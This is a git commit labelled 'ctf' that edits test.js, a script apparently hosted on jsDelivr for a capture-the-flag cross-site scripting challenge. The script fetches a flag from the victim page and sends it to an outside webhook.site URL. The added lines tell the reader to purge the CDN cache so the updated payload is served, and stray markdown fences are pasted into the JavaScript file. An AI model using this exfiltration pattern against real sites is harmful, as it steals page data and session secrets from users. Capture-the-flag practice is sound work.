1627e8fa6d497faab1dddf5fd6ac30db14c0fe63
growlyyy <oualidbaba2005@gmail.com>
2026-03-20 23:40:28 +0000

    ctf

--- test.js
+++ test.js
@@ -3,3 +3,8 @@ fetch('/xss-two-flag')
   .then(flag => {
     fetch('https://webhook.site/bd768cbb-7b2f-482a-8f91-86c61918d6af?flag=' + encodeURIComponent(flag));
   });
+```
+
+Then commit, purge the cache at:
+```
+https://purge.jsdelivr.net/gh/stevvv2005/ctf@main/test.js
